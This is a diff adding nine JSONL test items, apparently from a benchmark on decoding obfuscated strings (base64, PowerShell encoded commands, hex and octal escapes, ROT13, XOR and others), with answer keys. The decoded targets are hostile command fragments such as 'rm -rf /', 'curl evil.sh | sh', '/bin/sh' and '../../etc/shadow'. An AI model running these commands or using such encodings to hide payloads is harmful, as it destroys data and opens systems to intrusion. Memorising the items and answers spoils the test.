@@ -1,0 +1,9 @@
+{"id": "obh-001", "input": "Decode this DOUBLE base64-encoded string (apply base64-decode twice) and reply with ONLY the decoded text.\n\nWlhaaGJDaGhkRzlpS0hncEtRPT0=", "target": "eval(atob(x))", "metadata": {"encoding": "double-base64"}}
+{"id": "obh-002", "input": "This is a PowerShell -EncodedCommand value (base64 of UTF-16LE). Decode it and reply with ONLY the decoded command.\n\ndwBoAG8AYQBtAGkA", "target": "whoami", "metadata": {"encoding": "ps-encodedcommand"}}
+{"id": "obh-003", "input": "This JS builds a string via char codes: String.fromCharCode(100,114,111,112,32,116,97,98,108,101). Reply with ONLY the resulting string.", "target": "drop table", "metadata": {"encoding": "fromcharcode"}}
+{"id": "obh-004", "input": "Decode these JS \\x hex escapes and reply with ONLY the decoded text.\n\n\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f", "target": "rm -rf /", "metadata": {"encoding": "hex-escape"}}
+{"id": "obh-005", "input": "This is ROT13. Reply with ONLY the decoded text.\n\nphey rivy.fu | fu", "target": "curl evil.sh | sh", "metadata": {"encoding": "rot13"}}
+{"id": "obh-006", "input": "This path is DOUBLE URL-encoded (percent-decode it twice). Reply with ONLY the decoded path.\n\n..%252F..%252Fetc%252Fshadow", "target": "../../etc/shadow", "metadata": {"encoding": "double-url"}}
+{"id": "obh-007", "input": "Reverse this string, then base64-decode the result. Reply with ONLY the final decoded text.\n\n==Aaz9ibpJ2L", "target": "/bin/sh", "metadata": {"encoding": "reverse-then-base64"}}
+{"id": "obh-008", "input": "These hex bytes were each XORed with the key 0x2a. XOR them back with 0x2a and reply with ONLY the decoded ASCII text.\n\n444f5e494b5e", "target": "netcat", "metadata": {"encoding": "xor-hex"}}
+{"id": "obh-009", "input": "Decode these JS octal escapes and reply with ONLY the decoded text.\n\n\\160\\141\\163\\163\\167\\144", "target": "passwd", "metadata": {"encoding": "octal-escape"}}
